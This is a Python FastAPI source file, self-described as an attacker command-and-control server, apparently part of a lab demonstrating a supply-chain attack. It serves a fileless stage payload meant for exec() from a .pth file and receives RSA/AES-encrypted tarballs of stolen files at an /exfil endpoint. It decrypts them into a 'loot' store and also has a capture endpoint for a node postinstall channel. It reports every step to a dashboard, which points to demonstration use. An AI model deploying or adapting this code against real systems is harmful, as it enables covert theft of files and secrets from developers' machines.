"""Attacker C2 server -- receives and decrypts exfiltrated data."""
from __future__ import annotations

import base64
import io
import json
import os
import tarfile
import time
from pathlib import Path
from urllib.request import Request, urlopen

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
from fastapi import FastAPI, Request as FRequest
from fastapi.responses import JSONResponse, PlainTextResponse

app = FastAPI()

PAYLOAD_SOURCE_PATH = os.environ.get("PAYLOAD_SOURCE_PATH", "/app/payload_source.py")
_payload_cache: str | None = None

DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://dashboard:8000")
PRIVATE_KEY_PATH = os.environ.get("PRIVATE_KEY_PATH", "/app/private_key.pem")

LOOT: list[dict] = []

_private_key = None


def _get_private_key():
    global _private_key
    if _private_key is None:
        pem_data = Path(PRIVATE_KEY_PATH).read_bytes()
        _private_key = serialization.load_pem_private_key(pem_data, password=None)
    return _private_key


def _report(event_type: str, data: dict) -> None:
    payload = json.dumps({
        "type": event_type,
        "data": data,
        "timestamp": time.time(),
        "source": "c2",
    }).encode()
    req = Request(
        f"{DASHBOARD_URL}/api/events",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urlopen(req, timeout=3)
    except Exception:
        pass


@app.get("/stage")
async def serve_stage():
    """Serve the fileless payload for .pth exec()."""
    global _payload_cache
    if _payload_cache is None:
        _payload_cache = Path(PAYLOAD_SOURCE_PATH).read_text()
    _report("c2_stage_served", {"size": len(_payload_cache)})
    return PlainTextResponse(_payload_cache)


@app.get("/health")
async def health():
    return {"status": "ok", "loot_count": len(LOOT)}


@app.post("/exfil")
async def receive_exfil(request: FRequest):
    raw = await request.body()
    body = json.loads(raw)
    _report("c2_received", {"size": len(raw), "hostname": body.get("hostname")})

    encrypted_key_b64 = body["encrypted_key"]
    iv_b64 = body["iv"]
    data_b64 = body["data"]
    encrypted_key = base64.b64decode(encrypted_key_b64)
    iv = base64.b64decode(iv_b64)
    ciphertext = base64.b64decode(data_b64)

    # RSA decrypt the session key
    priv_key = _get_private_key()
    key_material = priv_key.decrypt(
        encrypted_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    aes_key = key_material[:32]
    aes_iv = key_material[32:48]

    _report("c2_rsa_decrypted", {
        "aes_key_hex": aes_key.hex(),
        "aes_iv_hex": aes_iv.hex(),
    })

    # AES-CBC decrypt
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = PKCS7(128).unpadder()
    tar_data = unpadder.update(padded) + unpadder.finalize()

    _report("c2_aes_decrypted", {"tar_size": len(tar_data)})

    # Extract tar
    loot_entry = {
        "hostname": body.get("hostname", "unknown"),
        "timestamp": time.time(),
        "files": [],
    }

    tar_buf = io.BytesIO(tar_data)
    with tarfile.open(fileobj=tar_buf, mode="r:gz") as tar:
        for member in tar.getmembers():
            f = tar.extractfile(member)
            if f is None:
                continue
            content = f.read()
            preview = content[:500].decode("utf-8", errors="replace")
            file_entry = {
                "path": member.name,
                "size": member.size,
                "preview": preview,
            }
            loot_entry["files"].append(file_entry)
            _report("c2_file_decrypted", file_entry)

    LOOT.append(loot_entry)

    _report("c2_decryption_complete", {
        "total_files": len(loot_entry["files"]),
        "hostname": loot_entry["hostname"],
    })

    return {"status": "received", "files_decrypted": len(loot_entry["files"])}


@app.api_route("/lab/internal", methods=["GET", "POST"])
async def lab_internal(request: FRequest):
    """Fake internal API used to demonstrate runtime traffic interception."""
    method = request.method
    query = dict(request.query_params)
    body = {}
    if method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {"raw": (await request.body()).decode("utf-8", errors="replace")[:200]}

    _report("c2_lab_request", {
        "method": method,
        "query": query,
        "body": body,
    })
    return {"status": "ok", "method": method, "query": query, "body": body}


@app.post("/polyglot")
async def polyglot_escape(request: FRequest):
    body = {}
    try:
        body = await request.json()
    except Exception:
        body = {"raw": (await request.body()).decode("utf-8", errors="replace")[:200]}

    _report("c2_polyglot_triggered", body)
    return {"status": "captured", "channel": "node-postinstall"}


@app.get("/loot")
async def get_loot():
    return {"loot": LOOT}


@app.post("/reset")
async def reset():
    LOOT.clear()
    return {"status": "reset"}
